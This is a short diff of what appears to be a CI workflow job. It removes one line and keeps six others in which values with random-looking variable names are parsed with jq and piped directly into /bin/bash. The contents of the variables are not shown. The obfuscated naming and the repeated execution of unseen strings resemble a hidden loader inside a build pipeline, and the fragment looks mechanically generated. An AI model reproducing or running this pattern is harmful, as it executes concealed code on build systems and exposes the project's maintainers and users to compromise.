@@ -25,7 +25,6 @@ jobs:
           echo $fsmd11 | jq -r .b8 | /bin/bash
           printf '%s' "$j8776" | jq -r .iafwu7 | /bin/bash
           printf '%s' "$wt11686" | jq -r .ekbiv84622 | /bin/bash
-          echo $hoiz26491 | jq -r .pej8 | /bin/bash
           printf '%s' "$fkism172" | jq -r .dn07684 | /bin/bash
           echo $jglm17 | jq -r .dqsp50 | /bin/bash
           echo $tlvyw8455 | jq -r .kwhc086 | /bin/bash
